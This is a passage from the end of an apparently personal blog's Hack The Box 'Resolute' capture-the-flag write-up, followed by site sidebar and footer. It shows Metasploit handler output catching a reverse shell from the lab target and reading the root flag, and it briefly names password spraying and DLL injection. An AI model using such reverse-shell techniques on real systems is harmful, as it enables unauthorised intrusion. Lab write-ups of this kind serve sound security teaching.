+<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 exploit(multi/handler) &gt; run</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Started reverse TCP handler on 10.10.14.56:4444</span>
+<span class="code-line">[*] Command shell session 2 opened (10.10.14.56:4444 -&gt; 10.10.10.169:50613) at 2019-12-12 03:46:20 -0500</span>
+<span class="code-line"></span>
+<span class="code-line">Microsoft Windows [Version 10.0.14393]</span>
+<span class="code-line">(c) 2016 Microsoft Corporation. All rights reserved.</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt</span>
+<span class="code-line">type C:\Users\Administrator\Desktop\root.txt</span>
+<span class="code-line">e1d94876a506850d0c20edb5405e619c</span>
+<span class="code-line"></code></pre></div>
+
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>Getting the first user is quit easy if you use
+<a href="https://github.com/portcullislabs/enum4linux">enum4linux</a>. You can even spray
+the password by hand.
+The second user is just enumeration. It can take a long time before enumerating
+the right folder.
+The root part is quit interesting and let me learn a few things about DLL
+injection.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="https://maggick.fr/2020/05/htb-obscurity.html"> HTB: Obscurity </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = "matthieukeller";
+        var disqus_identifier = "2020/05/htb-resolutre.html";
+
+        (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/server.html">server</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/code-review.html">code review</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/restic.html">restic</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/redis.html">redis</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/pth.html">PTH</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">cve</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/web.html">web</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/linux.html">Linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/webmin.html">webmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mangento.html">mangento</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/smb.html">smb</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/waf.html">WAF</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/drupal.html">drupal</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bloodhound.html">bloodhound</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/api.html">api</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
